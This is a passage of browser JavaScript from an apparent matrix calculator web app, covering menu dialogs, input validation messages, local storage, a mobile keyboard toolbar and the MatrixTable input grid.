    addMenuItem('show-latex-menuitem', i18n.matrixMenu.showLaTeX, onShowAsMenuitemClick);
    document.body.appendChild(matrixMenu);
    Utils.check(matrixMenu);
  }
  matrixMenu.setAttribute("data-for-matrix", dataForMatrix);//!
};

var initializeMenuDialog = function (menuDialog, items, trigger) {
    var focusedElements = 0;
    var closeDialog = function () {
      if (menuDialog.getAttribute("open") != undefined) {
        var focus = true;
        if (!menuDialog.contains(document.activeElement)) {
          focus = false;
        }
        menuDialog.removeAttribute("open");
        if (focus) {
          // https://github.com/whatwg/html/issues/5678
          trigger().focus();
        }
      }
    };
    var onItemFocus = function (event) {
      focusedElements += 1;
    };
    var onItemBlur = function (event) {
      focusedElements -= 1;
      window.setTimeout(function () {
        if (focusedElements === 0) {
          closeDialog();
        }
      }, 10);
    };
    var onItemClick = function (event) {
      event.preventDefault();//selection
      var i = event.target.getAttribute("data-i");
      if (i != undefined) {
        items[i].click();
      }
      closeDialog();
    };
    // https://www.w3.org/TR/wai-aria-practices-1.1/examples/listbox/js/listbox.js
    var keysSoFar = '';
    var startNode = null;
    var keyClear = 0;
    var clearKeysSoFar = function () {
      keysSoFar = '';
      startNode = null;
      keyClear = 0;
    };
    menuDialog.addEventListener("keypress", function (event) {
      if (!event.ctrlKey && !event.altKey && !event.metaKey && !event.defaultPrevented) {
        var target = document.activeElement;
        if (target.parentNode === this) {
          var s = String.fromCharCode(event.charCode).toLocaleUpperCase();
          if (startNode == null) {
            startNode = target;
          }
          keysSoFar += s;
          window.clearTimeout(keyClear);
          keyClear = window.setTimeout(clearKeysSoFar, 300);
          var node = startNode;
          for (var x = node.nextElementSibling || this.firstElementChild; x !== startNode; x = x.nextElementSibling || this.firstElementChild) {
            var label = x.textContent;
            if (keysSoFar === label.slice(0, keysSoFar.length).toLocaleUpperCase() && node === startNode) {
              node = x;
            }
          }
          if (node !== startNode) {
            event.preventDefault();
            node.focus();
          }
        }
      }
    }, false);
    menuDialog.addEventListener("keydown", function (event) {
      if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
        var keyCode = event.keyCode;
        var target = document.activeElement;
        if (target.parentNode === this) {
          var DOM_VK_LEFT = 37;
          var DOM_VK_UP = 38;
          var DOM_VK_RIGHT = 39;
          var DOM_VK_DOWN = 40;
          var DOM_VK_ESCAPE = 27;
          var DOM_VK_RETURN = 13;

          if (keyCode === DOM_VK_LEFT || keyCode === DOM_VK_UP) {
            var previous = target.previousElementSibling;
            if (previous == undefined) {
              previous = this.lastElementChild;
            }
            if (previous != undefined) {
              event.preventDefault();
              previous.focus();
            }
          }
          if (keyCode === DOM_VK_RIGHT || keyCode === DOM_VK_DOWN) {
            var next = target.nextElementSibling;
            if (next == undefined) {
              next = this.firstElementChild;
            }
            if (next != undefined) {
              event.preventDefault();
              next.focus();
            }
          }
          if (keyCode === DOM_VK_ESCAPE) {
            event.preventDefault();
            closeDialog();
          }
          if (keyCode === DOM_VK_RETURN) {
            event.preventDefault();
            target.click();
          }
        }
      }
    }, false);
    var elements = menuDialog.querySelectorAll(".menuitem");
    for (var k = 0; k < elements.length; k += 1) {
      elements[k].addEventListener("focus", onItemFocus, false);
      elements[k].addEventListener("blur", onItemBlur, false);
      if (items != null) {//?
        elements[k].onclick = onItemClick;
      }
    }
};

var getMatrixMenuDialog = function (matrixMenu) {
  var matrixMenuDialog = document.getElementById("matrix-menu-dialog");
  if (matrixMenuDialog == undefined) {//?
    matrixMenuDialog = document.createElement("div");
    matrixMenuDialog.id = "matrix-menu-dialog";
    matrixMenuDialog.classList.toggle("menu-dialog", true);
    matrixMenuDialog.setAttribute("role", "menu");
    var items = matrixMenu.querySelectorAll("menuitem");
    var html = "";
    for (var i = 0; i < items.length; i += 1) {
      html += "<a role=\"menuitem\" class=\"menuitem\" tabindex=\"0\" data-i=\"" + i.toString() + "\">" + items[i].getAttribute("label") + "</a>";
    }
    matrixMenuDialog.innerHTML = html;
    initializeMenuDialog(matrixMenuDialog, items, function () {
      var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
      //var focusNode = matrixContainer;//TODO: fix - cannot focus MathML element
      var focusNode = getMatrixMenuShow(matrixContainer);
      return focusNode;
    });
    document.body.appendChild(matrixMenuDialog);
  }
  return matrixMenuDialog;
};

var onCopyMatrixToClipboard = function (event) {
  hit({click: "copy-matrix-to-clipboard-menuitem"});
  var matrixMenu = this.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  //var focusNode = matrixContainer;//TODO: fix - cannot focus MathML element
  var focusNode = getMatrixMenuShow(matrixContainer);
  focusNode.focus();
  window.getSelection().collapse(focusNode, 0);
  // The previous line moves the focus to the body in Edge 17
  if (document.activeElement !== focusNode) {
    focusNode.focus();
  }
  try {
    document.execCommand("copy");
  } catch (error) {
    handleError("", "", error, {});
  }
};

// button
Utils.on("click", ".matrix-menu-show", function (event) {
  hit({click: "matrix-menu-show"});
  prepareMatrixMenu(this.getAttribute("data-for-matrix"));
  var matrixMenu = document.getElementById("matrix-menu");
  var matrixMenuDialog = getMatrixMenuDialog(matrixMenu);
  var anchorRect = this.getBoundingClientRect();
  matrixMenuDialog.style.position = 'absolute';
  matrixMenuDialog.style.left = Math.min(Math.max(window.pageXOffset + anchorRect.left, 0), window.innerWidth) + 'px';
  matrixMenuDialog.style.top = (window.pageYOffset + anchorRect.bottom) + 'px';
  matrixMenuDialog.style.transformOrigin = "top left";
  matrixMenuDialog.setAttribute("open", "open");
  if (document.documentElement.dir === 'rtl') {
    matrixMenuDialog.style.left = Math.min(Math.max(window.pageXOffset + anchorRect.right - matrixMenuDialog.offsetWidth, 0), window.innerWidth) + 'px';
  }
  if (anchorRect.bottom + matrixMenuDialog.offsetHeight > window.innerHeight) {
    matrixMenuDialog.style.top = (window.pageYOffset + anchorRect.top - matrixMenuDialog.offsetHeight) + 'px';
    matrixMenuDialog.style.transformOrigin = "bottom left";
  }
  matrixMenuDialog.firstElementChild.focus();//?
});

// button
Utils.on("click", ".popup-button", function (event) {
  var popupButton = event.target.closest('.popup-button');
  var menuDialog = document.getElementById(popupButton.getAttribute("data-menu"));
  if (menuDialog.getAttribute("data-initialized") == null) {
    //TODO: fix

    initializeMenuDialog(menuDialog, null, function () {
      return popupButton;
    });
    menuDialog.setAttribute("data-initialized", "true");
  }
  menuDialog.setAttribute("open", "open");
  menuDialog.firstElementChild.focus();//?
});

// << Tables >>

var MatrixTables = {};

// << MatrixTable >>


//-----------------!

var getInputError = function (error) {
  if (error != null) {
    var t = null;
    var x = ' ';
    var y = ' ';
    var match = null;
    if ((match = /^UserError\: unexpected end of input, '([\s\S]+)' expected$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedEndOfInputYExpected;
      y = match[1];
    } else if ((match = /^UserError\: unexpected '([\s\S]+)', '([\s\S]+)' expected$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedXYExpected;
      x = match[1];
      y = match[2];
    } else if ((match = /^UserError\: unexpected '([\s\S]+)'$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedX;
      x = match[1];
    } else if ((match = /^UserError\: unexpected end of input$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedEndOfInput;
    } else {
      console.error(error.message);
    }
    if (t != null && t !== "") {
      return t.replace(/\$\{x\}/g, "<code>" + x + "</code>").replace(/\$\{y\}/g, "<code>" + y + "</code>");
    }
  }
  return i18n.errors.inputError.replace(/\$\{listOfExamples\}/g, i18n.listOfExamples).replace(/\$\{listOfComplexExamples\}/g, i18n.listOfComplexExamples) + i18n.colonSpacing + ":";
};

globalThis.getInputError = getInputError;//TODO: remove

  var setInputCustomValidity = function (input, checkedValue, error) {
    if (input.value === checkedValue) {
      var dataTitle = input.getAttribute("data-title");
      if (dataTitle == undefined) {
        var title = input.title || "";
        input.setAttribute("data-title", title);
        dataTitle = title;
      }
      if (error == null) {
        if (dataTitle !== "") {
          input.title = dataTitle;
        } else {
          input.removeAttribute('title'); // input.title = ""; does not work as expected
        }
      } else {
        Utils.waitI18n(function () {
        input.title = getInputError(error).replace(/<[^>]*>/g, "").replace(/\s*\:/g, "");
        });
      }
      var e = input.parentNode.classList.contains("a-input") ? input.parentNode : input;
      var isValid = error == null;
      //e.classList.toggle("invalid", !isValid);
      var ariaInvalid = !isValid ? "true" : "false";
      if (e.getAttribute("aria-invalid") !== ariaInvalid) { // Style Recalculation
        e.setAttribute("aria-invalid", ariaInvalid);
        input.setAttribute("aria-invalid", ariaInvalid);
      }
    }
  };

  var getInputValue = function (value, type) {
    var v = value.trim();
    // Users are often trying to input "-"/"+" instead of "-1"/"+1" for SLU
    if ((v === "-" || v === "+") && type === "system") {
      return v + "1";
    }
    if (v === "") {
      return "0";
    }
    return value;
  };


var checkInput = function (input, type) {
  var inputName = input.name;
  requestIdleCallback(inputName, waitExpression(function () {
    var checkedValue = input.value;
    var value = getInputValue(checkedValue, type); // getInputValue
    RPNProxy.checkExpression(value).then(function () {
      removeDataErrorAttribute(input);
      setInputCustomValidity(input, checkedValue, null);
    }, function (error) {
      RPNProxy.getPositionInfo().then(function (positionInfo) {//TODO: REMOVE
        updateDataErrorAttribute(input, error, positionInfo);
      });
      //TODO: other errors
      setInputCustomValidity(input, checkedValue, error);
    });
  }), 50);
};

// type: "simple" | "system"
var checkTextarea = function (textarea, type) {
  requestIdleCallback(textarea.name, waitExpression(function () {
    var textareaValue = textarea.value;
    RPNProxy.checkExpressions(textareaValue, type).then(function () {
      removeDataErrorAttribute(textarea);
      setInputCustomValidity(textarea, textareaValue, null);
    }, function (error) {
      RPNProxy.getPositionInfo().then(function (positionInfo) {//TODO: REMOVE
        updateDataErrorAttribute(textarea, error, positionInfo, true);//?
      });
      //TODO:
      console.log(error);
      setInputCustomValidity(textarea, textareaValue, error);
    });
  }), 200);
};

var requestAnimationFrameQueue = []; // for better performance
Utils.initialize(".a-input", function (element) {
  if (requestAnimationFrameQueue.length === 0) {
    window.requestAnimationFrame(waitExpression(function () { // window.getComputedStyle(...)
        for (var i = 0; i < requestAnimationFrameQueue.length; i += 1) {
          var element = requestAnimationFrameQueue[i];
          initializeAInput(element);
        }
        requestAnimationFrameQueue.length = 0;
    }));
  }
  requestAnimationFrameQueue.push(element);
  element.setAttribute("dir", "ltr"); // "math-dir"
  element.setAttribute('lang', '');
  var input = element.querySelector(".fraction-input");
  if (input != undefined) {
    input.addEventListener("input", function (event) {
      var input = event.target;
      checkInput(input, "");
    }, false);
    checkInput(input, ""); // autofill
  }
});


Utils.initialize(".a-highlight", function (e) { initializeAHighlight(e); });
Utils.initialize(".a-tooltip", function (e) { initializeATooltip(e); });


var keyStorage = {
  a: function (methodName, key, value) {
    var result = undefined;
    try {
      var storage = window.localStorage;
      if (storage == undefined) {
        console.log("No localStorage");
        hit({localStorage: "No localStorage"});
      } else {
        if (methodName === "getItem") {
          result = storage.getItem(key);
        } else if (methodName === "setItem") {
          storage.setItem(key, value);
          if (storage.getItem(key) !== value) {
            console.log("No error");
            hit({localStorage: "No error"});
          }
        } else {
          throw new TypeError(methodName);
        }
      }
    } catch (error) {
      if (error.name === 'SecurityError') {
        console.debug(error.toString());
      } else {
        console.log(error);
      }
      hit({localStorage: error.name});
    }
    return result;
  },
  getItem: function (key) {
    return keyStorage.a("getItem", key, undefined);
  },
  setItem: function (key, value) {
    if (keyStorage.a("setItem", key, value) != undefined) {
      throw new TypeError();
    }
  }
};

globalThis.keyStorage = keyStorage;//TODO: remove

var timeoutIds = {};
var delayByKey = {};
var requestIdleCallback = function (key, callback, delay) {
  var timeoutId = timeoutIds[key];
  if (timeoutId == undefined || timeoutId === 0) {
    timeoutId = window.setTimeout(function () {
      timeoutIds[key] = 0;
      var start = Date.now();
      callback();
      var end = Date.now();
      if (end - start > 300) {
        hit({checkInput: roundValue(end - start, 1000 - 1)});
      }
      delayByKey[key] = Math.min(5000, Math.max(delay, end - start));//?
    }, delayByKey[key] || delay);
    timeoutIds[key] = timeoutId;
  }
};

function noHardwareKeyboard() {
  // https://github.com/w3c/csswg-drafts/issues/3871
  // any-pointer: fine is not enough on 
  return !(window.matchMedia("(pointer: fine)").matches && window.matchMedia("(hover: hover)").matches);
}

MatrixTable.numbersOnlyMode = false;
MatrixTable._toolbarActivated = false;
MatrixTable._activateVirtualKeyboardToolbar = function () {
  if (MatrixTable._toolbarActivated) {
    return;
  }
  MatrixTable._toolbarActivated = true;

  if (!noHardwareKeyboard()) {
    return;
  }
  if (window.visualViewport == null) {
    return;
  }

  var bottomBar = document.createElement('div');
  bottomBar.classList.toggle('virtual-keyboard-toolbar');
  bottomBar.setAttribute('role', 'toolbar');
  bottomBar.innerHTML = '' +
    '<button type="button" aria-pressed="mixed" class="numbers-only-mode-button">⌨</button>' +
    '<button type="button">&minus;</button>' +
    '<button type="button">/</button>' +
    '<button type="button">(</button>' +
    '<button type="button">)</button>' +
    '<button type="button">√</button>'
  '';
  document.body.appendChild(bottomBar);

  //!new 2020-10-06
  var numbersOnlyModeKey = "~" + window.location.pathname + "~" + "A" + "~" + "numbersOnlyMode";
  var t = keyStorage.getItem(numbersOnlyModeKey);
  MatrixTable.numbersOnlyMode = t == undefined || Boolean(t);

  var numbersOnlyModeButton = bottomBar.querySelector(".numbers-only-mode-button");
  Utils.waitI18n(function () {
    numbersOnlyModeButton.title = i18n.buttons.useDecimalKeyboardOnMobilePhones;
  });
  numbersOnlyModeButton.onclick = function (event) {
    event.preventDefault();
    MatrixTable.numbersOnlyMode = !MatrixTable.numbersOnlyMode;
    numbersOnlyModeButton.setAttribute("aria-pressed", MatrixTable.numbersOnlyMode ? "true" : "false");

    var inputs = document.querySelectorAll('.matrix-table-input'); // not input[type="file"]
    for (var i = 0; i < inputs.length; i += 1) {
      MatrixTable._setInputType(inputs[i], inputs[i].value);
    }
    keyStorage.setItem(numbersOnlyModeKey, MatrixTable.numbersOnlyMode);
  };
  bottomBar.addEventListener('click', function (event) {
    if (event.target !== numbersOnlyModeButton && event.target.matches('button')) {
      document.execCommand("insertText", false, event.target.textContent.replaceAll('−', '-'));
    }
  });
  bottomBar.addEventListener('pointerdown', function (event) {
    event.preventDefault();
  });
  numbersOnlyModeButton.setAttribute('aria-pressed', MatrixTable.numbersOnlyMode ? "true" : "false");

  // from https://wicg.github.io/visual-viewport/examples/fixed-to-keyboard.html :
  var viewport = window.visualViewport;
  document.documentElement.style.scrollPaddingBottom = '40px'; // - ?
  function updateBar() {
    bottomBar.style.visibility = (document.activeElement == null || !document.activeElement.matches('.matrix-table-input')) ? 'hidden' : '';

    // Since the bar is position: fixed we need to offset it by the
    // visual viewport's offset from the layout viewport origin.
    var offsetY = window.innerHeight
        - viewport.height
        - viewport.offsetTop;

    bottomBar.style.left = viewport.offsetLeft + 'px';
    bottomBar.style.bottom = offsetY + 'px';
    bottomBar.style.transform = "scale(" + (1 / viewport.scale) + ")";
  }
  updateBar();

  var requested = 0;
  function updateBar0() {
    window.clearTimeout(requested);
    requested = window.setTimeout(function () { // when focus goes to next input
      updateBar();
    }, 100);
  }
  window.addEventListener("focus", updateBar0, true);
  window.addEventListener("blur", updateBar0, true);
  viewport.addEventListener('resize', updateBar0);
  viewport.addEventListener('scroll', updateBar);
};

// type : "simple", "system"
function MatrixTable(name, initialRows, initialCols, type, container) {
  this.name = name;
  this.rows = 0;
  this.cols = 0;
  this.initRows = initialRows;
  this.initCols = initialCols;
  this.mode = "cells";
  this.type = type;
  this.container = container;
  this.onmodechange = undefined;
  this.table = [];
  this.updateRequested = false;

  //class=\"matrix\"

  if (container.querySelector('.matrix-table-inner') == null) { // not initialized already
    MatrixTableBase.initialize(container, type, name);
  }
  this.tbody = container.querySelector("mtable");

  var matrixTableInner = container.querySelector(".matrix-table-inner");
  matrixTableInner.setAttribute("data-for", this.name);

  var clearTableButton = container.querySelector(".clear-table-button");

  var swapModeButton = container.querySelector(".swap-mode-button");

  MatrixTable._activateVirtualKeyboardToolbar();

  var that = this;
  //TODO: 
  //matrixTableInner.setAttribute("dir", "ltr"); // "math-dir"
  clearTableButton.onclick = function (event) {
    if (event.pointerType !== 'mouse' && event.pointerType != null || !window.matchMedia("(pointer: fine)").matches) {//"polyfill"
      //TODO: 'Are you sure?'
      if (!window.confirm(clearTableButton.title + '?')) {
        return;
      }
    }
    hit({click: "clear-table-button"});
    that.insert({
      inputValues: [],
      textareaValue: "",
      rows: that.initRows,
      cols: that.initCols
    });
  };

  var onResizeTable = function (event) {
    hit({click: "resize-table-button"});
    var increment = Number(this.getAttribute("data-increment"));
    that._resizeTable(that.rows + increment, that.cols + increment);
  };
  //var resizeButtons = container.querySelectorAll(".resize-table-button");
  this.incrementSizeButton = container.querySelector(".increment-size-button");
  this.incrementSizeButton.onclick = onResizeTable;
  this.decrementSizeButton = container.querySelector(".decrement-size-button");
  this.decrementSizeButton.onclick = onResizeTable;

  var onSwapModeChange = waitExpression(function (event) {//TODO: waitExpression - ?
    hit({swapMode: window.matchMedia("(pointer: fine)").matches.toString()});
    event.preventDefault();
    var isChecked = this.getAttribute("aria-pressed") === "true";
    var isCellsMode = !isChecked;
    this.setAttribute("aria-pressed", isCellsMode ? "true" : "false");
    if ((isCellsMode && that.mode !== "cells") || (!isCellsMode && that.mode === "cells")) {
      that.onswapmode();
    }
  });
  swapModeButton.disabled = false;
  swapModeButton.onclick = onSwapModeChange;

  this.swapModeButton = swapModeButton;

  var uploadImageButton = container.querySelector(".upload-image");
  var uploadImageInput = container.querySelector("[name=upload]");
  uploadImageButton.onclick = function (event) {
    uploadImageInput.hidden = false; // Opera 12
    uploadImageInput.click();
    uploadImageInput.hidden = true; // Opera 12
  };
  uploadImageInput.onchange = function (event) {
    var files = event.target.files;
    //TODO: dialog - ?
    DnD.onDropOrPaste.call(container, {
      type: 'drop',
      target: container,
      clientX: 0,
      clientY: 0,
      dataTransfer: {
        getData: function () {},
        files: files
      },
      preventDefault: function () {}
    });
  };
  uploadImageButton.hidden = !hasNativeTextDetector;

  var initUndoRedoButton = function (command) {
    var button = container.querySelector(command === "undo" ? ".undo-button" : ".redo-button");
    button.onclick = function (event) {
      event.preventDefault();
      document.execCommand(command, false);
    };
    button.onpointerdown = function (event) {
      event.preventDefault();
    };
    window.addEventListener("input", function (event) {
      button.disabled = !document.queryCommandEnabled(command);
    }, true);
    button.title = command.toLowerCase(); //TODO: !?
    button.hidden = false;
  };
  if (noHardwareKeyboard()) {
    initUndoRedoButton('undo');
    initUndoRedoButton('redo');
  }

  this.textarea = container.querySelector("textarea");
  var onTextareaInput = function (event) {
    checkTextarea(that.textarea, that.type);
    that.update(event);
  };
  this.textarea.addEventListener("input", onTextareaInput, false);

  container.setAttribute("data-matrix-table", this.name);

  Utils.check(container);

  this.variableNames = undefined;

  this._updateVariableNames = function (event) {
    that.updateVariableNames(event);
  };
}

MatrixTableBase.onKeyDown = function (event) {
  var mt = MatrixTables[event.target.getAttribute('data-for')];
  mt.onKeyDown(event);
};
MatrixTableBase.onInput = function (event) {
  var mt = MatrixTables[event.target.getAttribute('data-for')];
  var input = event.target;
  checkInput(input, mt.type);
  mt.update(event);
};

MatrixTable._setInputType = function (input, inputValue) {
  // no way to input negative numbers on some android devices with inputmode="numeric" or inputmode="decimal" or type="number"
  // https://bugs.webkit.org/show_bug.cgi?id=197916 - numeric becomes useless in iOS 13
  //var userAgent = window.navigator.userAgent;
  //var inputMode = /android/i.test(userAgent) || !/OS\s+12/.test(userAgent) ? '' : 'numeric';
  //input.setAttribute("inputmode", inputMode);

  // in case not only numbers are inserted switch to text mode as <input type="number"> cannot be set to contain such values
if (false) {
  var type = MatrixTable.numbersOnlyMode && isFloatingPoint(inputValue) ? 'number' : 'text';
  if (input.type !== type) {
    input.type = type;
    // input[type="number"] does not allow to get value when the raw input is not a valid number,
    // it does not allow to enter not a numbers anyway:
    input.closest('.a-input').classList.toggle('enabled', document.hasFocus() && !MatrixTable.numbersOnlyMode);
    input.setAttribute('step', 'any');
  }
} else {
  // will try to use inputmode to support more characters
  input.inputMode = MatrixTable.numbersOnlyMode ? 'decimal' : '';
  if (document.activeElement === input) {
    document.body.focus();
    input.focus();
  }
}
};

MatrixTable.prototype._resizeTable = function (newRows, newCols) {
  this.insert({
    rows: newRows,
    cols: newCols
  });
};

MatrixTable.prototype.getState = function () {
  return {
    type: this.type,
    mode: this.mode,
    inputValues: this.mode === "cells" ? this.getRawInput("cells") : undefined,
    variableNames: this.variableNames,
    textareaValue: this.mode !== "cells" ? this.getRawInput("") : undefined,
    rows: this.rows,
    cols: this.cols,
    textareaStyleWidth: this.textarea != undefined ? this.textarea.style.width : undefined,
    textareaStyleHeight: this.textarea != undefined ? this.textarea.style.height : undefined,
    firstInputElementId: this.getFirstInputElementId()
  };
};

MatrixTable.prototype.getDataState = function () {
  var state = {
    type: this.type,
    mode: this.mode,
    inputValues: this.mode === "cells" ? this.getRawInput("cells") : undefined,
    variableNames: this.variableNames,
    textareaValue: this.mode !== "cells" ? this.getRawInput("") : undefined,
    firstInputElementId: this.getFirstInputElementId()
  };
  if (state.mode === "cells") {
    var type = this.type;
    var inputValues = state.inputValues;
    for (var i = 0; i < inputValues.length; i += 1) {
      for (var j = 0; j < inputValues[i].length; j += 1) {
        inputValues[i][j] = getInputValue(inputValues[i][j], type);
      }
    }
  }
  return state;
};

MatrixTable.prototype._availableWidth = function () {
  // document.documentElement.clientWidth on Android
  // trying to use window.visualViewport.width to avoid forcing layout (?)
  var viewportWidth = Math.min(window.innerWidth, (window.visualViewport != null && window.visualViewport.scale === 1 ? 1/0 : document.documentElement.clientWidth));
  var vw = ((viewportWidth <= 800 ? viewportWidth : viewportWidth - 200) / 17 - 2) / 0.55; //!?
  return vw;
};

// private
MatrixTable.prototype.updateInputWidths = function () {
  var dimensions = this.getDimensions(true);
  var expectedRows = dimensions.rows;
  var expectedCols = dimensions.cols;

  var table = this.table;
  var vw = this._availableWidth();

  var cols = table.length === 0 ? 0 : table[0].length;
  for (var j = 0; j < cols; j += 1) {
    var maxLength = 1; // placeholder.length
    for (var i = 0; i < table.length; i += 1) {
      var l = _getValue(table[i][j]).length;
      maxLength = Math.max(maxLength, l);
    }
    for (var i = 0; i < table.length; i += 1) {
      var w = 2 + maxLength;
      var minWidth = this.type === "system" ? 5 : (6 + 1/3);
      if (minWidth + (this.type === "system" ? 3.33 : 0) > vw / cols || cols > (this.type === "system" ? 10 : 20)) {//TODO:
        minWidth = 2 + maxLength;
      }
      if (w < minWidth) {
        w = minWidth;
      }
      if (w > 17 && w > vw / cols) {
        w = 17;
      }
      var input = table[i][j];
      input.style.minWidth = ch(minWidth + "ch");// (minWidth * 0.6) + "em";
      input.style.maxWidth = ch(w + "ch");// (w * 0.6) + "em";
      //TODO: set max-width somehow (?)

      //!
      var out = (i >= expectedRows || j >= expectedCols) && (i >= expectedRows || this.type !== "system" || j !== table[i].length - 1);
      var isFirefox = /firefox/i.test(window.navigator.userAgent);//TODO: fix
      if (input.tagName.toLowerCase() === 'input' && isFirefox) {
        // https://twitter.com/4esn0k/status/1240749397459324930
        // only hide placeholder
        input.classList.toggle('placeholder-hidden', out);
        if (input.placeholder === '') {
          input.placeholder = '0';
        }
      } else {
        if (input.placeholder !== (out ? '' : '0')) {
          input.placeholder = (out ? '' : '0');
        }
      }
      var far = (i > expectedRows || j > expectedCols) && (i > expectedRows || this.type !== "system" || j !== table[i].length - 1);
      input.classList.toggle("far", far);
      var cellChild = input.closest('mi');
      var previousElementSibling = cellChild.previousElementSibling;
      if (previousElementSibling != undefined) {
        previousElementSibling.classList.toggle("far", far);
      }
      var nextElementSibling = cellChild.nextElementSibling;
      while (nextElementSibling != null) {
        nextElementSibling.classList.toggle("far", far);
        nextElementSibling = nextElementSibling.nextElementSibling;
      }
    }
  }
};

//private
MatrixTable.prototype.updateTextareaHeight = function () {
  var vw = this._availableWidth();
  var value = this.textarea.value;
  var i = 0;
  var c = 0;
  var width = 0;
  while (i >= 0) {
    c += 1;
    var n = value.indexOf('\n', i + 1);
    width = Math.max(width, (n === -1 ? value.length : n) - (i + 1));
    i = n;
  }
  var placeholderLines = Math.max(3, (this.textarea.placeholder || '').trim().split('\n').length + 1);
  var h = Math.floor(Math.max(placeholderLines + 1, c + 2) * 4 / 3);
  this.textarea.style.minHeight = Math.min(h, 12).toString() + "em";
  this.textarea.style.minWidth = ch(Math.min(width + 1, vw) + 'ch');
  if (this.type === 'system') {
    this.textarea.cols = Math.min(36, vw);
  }
};

// private
MatrixTable.prototype.update = function (event) {
  var that = this;
  if (!this.updateRequested) {
    // requestAnimationFrame(f) allows to delay the update when doing MatrixTable#insert and does not cause flickering as setTimeout(f, 0) when user inputs something
    this.updateRequested = true;
    window.requestAnimationFrame(function () {
      that.updateRequested = false;
      if (that.mode === "cells") {
        that.updateInputWidths();
      } else {
        that.updateTextareaHeight();
      }
    });
  }
};

  //TODO: move somewhere
MatrixTable.prototype.updateVariableNames = function (event) {
  var variableName = event.target.getAttribute('data-value');
  var j = Number(event.target.getAttribute('data-index'));
  this.variableNames[j] = variableName;
  //TODO: - ?
  //var t2 = this.getState();
  //this.insert(t2);
  //TODO: remove
  var c = makeContent(variableName);
  var tbody = this.tbody;
  //! should work on <mtable></mtable> (no HTMLTableSectionElement#rows)
  for (var row = tbody.firstElementChild.nextElementSibling; row != null; row = row.nextElementSibling) {
    var cell = row.firstElementChild;
    for (var i = 0; i < j; i += 1) {
      cell = cell.nextElementSibling;
    }
    cell.lastElementChild.innerHTML = c;
  }
};

function updateInputValue(input, value) {
  // This method updates the value of an <input> or a <textarea> element trying to preserve undo/redo history stack.
  // It can change focused element as a side effect
  // It does not change it back for performance reasons (?)
  input.focus({preventScroll: true});
  if (typeof input.select !== 'function') { // Firefox during loading of <custom-input>
    window.getSelection().selectAllChildren(input);
  } else {
    input.select();
  }
  // documen.activeElement is not input on Mobile Safari somehow, but insertText works
  insertText(value, input);
  //Note: insertText dispatches the input event

  if (value === "" && input.value !== "" && document.queryCommandEnabled("delete")) { // Safari 5.1.7 does not clear the value with "insertText" command
    document.execCommand("delete");
  }
}

// see https://github.com/samthor/undoer
function undoManager() {
}

undoManager._input = null;
undoManager._undo = [];
undoManager._redo = [];
undoManager._id = 0;
undoManager.addItem = function (item) {
  undoManager._redo = [];
  undoManager._undo.push(item);
  if (undoManager._input == null) {
    var input = document.createElement('div');
    input.contentEditable = true; // for Firefox use it intead of <input> (global undo stack)
    input.style.opacity = 0;
    input.style.position = 'fixed';
    input.style.left = '-1000px';
    input.style.top = '-1000px';
    input.style.width = '0px';
    input.style.height = '0px';
    input.tabIndex = -1;
    input.style.visibility = 'hidden';
    input.oninput = function (event) {
      if (event.inputType === 'historyUndo') {
        var item = undoManager._undo.pop();
        if (item != null) {
          undoManager._redo.push(item);
          item.undo();
        }
      } else if (event.inputType === 'historyRedo') {
        var item = undoManager._redo.pop();
        if (item != null) {
          undoManager._undo.push(item);
          item.redo();
        }
      }
    };
    document.body.appendChild(input);
    undoManager._input = input;
  }
  var input = undoManager._input;
  input.style.visibility = '';
  try {
    input.focus();
    if (document.activeElement === input) {
      undoManager._id += 1;
      document.execCommand('selectAll'); // does chrome join "insertText" unless we select all ?
      document.execCommand('insertText', false, undoManager._id);
    }
  } finally {
    input.style.visibility = 'hidden';
  }
};


var numberFormat = null;
globalThis.addEventListener('languagechange', function (event) {
  numberFormat = null;
});
var localeString = function (number) {
  console.assert(Math.floor(number) === number && 1 / number > 0 && number >= 0 && number <= Number.MAX_SAFE_INTEGER);
  if (numberFormat == null) {
    numberFormat = new Intl.NumberFormat(undefined, {useGrouping: false});
  }
  return numberFormat.format(number);
};

function isFloatingPoint(s) {
  return /^\-?\d*\.?\d*(?:[eE][+\-]?\d+)?$/.test(s.trim() || '0');
}

//TODO: REMOVE
/*
MatrixTableBase.onInputOnRemovedInput = function (event) {
  var input = event.target;
  var name = input.name.split('-');
  var tableName = name[0];
  var row = Number(name[1]);
  var column = Number(name[2]);
  var mt = MatrixTables[tableName];
  if (mt == undefined) {
    // restore table
    addTable(tableName);
    mt = MatrixTables[tableName];
  }
  var state = mt.getState();
  mt._resizeTable(Math.max(row + 1, state.rows), Math.max(column + 1, state.cols));
};
*/

MatrixTable._ignoreFlag = false;//TODO: REMOVE

// `inputValues` - array of array of strings (non-square)
MatrixTable.prototype.insert = function (options) {
  var inputValues = options.inputValues;
  var textareaValue = options.textareaValue;
  var rows = options.rows;
  var cols = options.cols;
  var textareaStyleWidth = options.textareaStyleWidth;
  var textareaStyleHeight = options.textareaStyleHeight;
  var mode = options.mode;
  var variableNames = options.variableNames;
  var isResizeOrInitialization =  inputValues == null && textareaValue == null; // to not add entries to undo/redo history when adding/removing cells
  if (inputValues == undefined) {
    inputValues = [];
  }
  if (rows == undefined) {
    rows = inputValues.length;
  }
  if (cols == undefined) {
    cols = 0;
    for (var y = 0; y < inputValues.length; y += 1) {
      cols = Math.max(cols, inputValues[y].length);
    }
  }
  if (mode == undefined) {
    mode = this.mode;
  }
if (rows !== -1 / 0 || cols !== -1 / 0) {
  if (rows === 0) {
    rows = this.initRows;
    cols = this.initCols;
  }
  rows = Math.max(rows, 1);
  cols = Math.max(cols, 1);
  if (this.type === "system") {
    cols = Math.max(cols, 2);
  }
} else {
  rows = 0;
  cols = 0;
}
  variableNames = variableNames || this.variableNames;

  var oldCols = this.cols;
  var oldRows = this.rows;

  this.rows = rows;
  this.cols = cols;

  var name = this.name;
  var that = this;

  this.variableNames = variableNames;
  if (this.type === 'system') {
    this.variableNames = new Array(this.cols);
    for (var j = 0; j < this.cols; j += 1) {
      this.variableNames[j] = variableNames != null && j < variableNames.length ? variableNames[j] : 'x_' + localeString(j + 1);
    }
  }

